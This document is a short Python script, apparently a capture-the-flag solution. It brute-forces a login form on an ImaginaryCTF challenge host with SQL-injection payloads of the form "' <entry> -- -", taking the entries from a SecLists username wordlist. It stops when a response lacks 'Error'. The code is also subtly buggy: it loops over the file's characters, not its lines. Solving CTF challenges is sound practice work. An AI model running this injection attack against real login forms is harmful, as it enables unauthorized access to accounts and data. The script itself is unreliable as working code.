#!/usr/bin/python3

import re

import requests

with open("/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt", 'r') as f:
	dat = f.read()
#print(dat)
#exit()

for username in dat:

	url = "https://awkward-bypass.chal.imaginaryctf.org/user"

	payload = {"username": "' %s -- -" % (username),"password": "' %s -- -" %(username)}
	#print(payload)

	r = requests.post(url, data=payload)

	print(r.text)
	if "Error" not in r.text:
		print(payload)
		exit()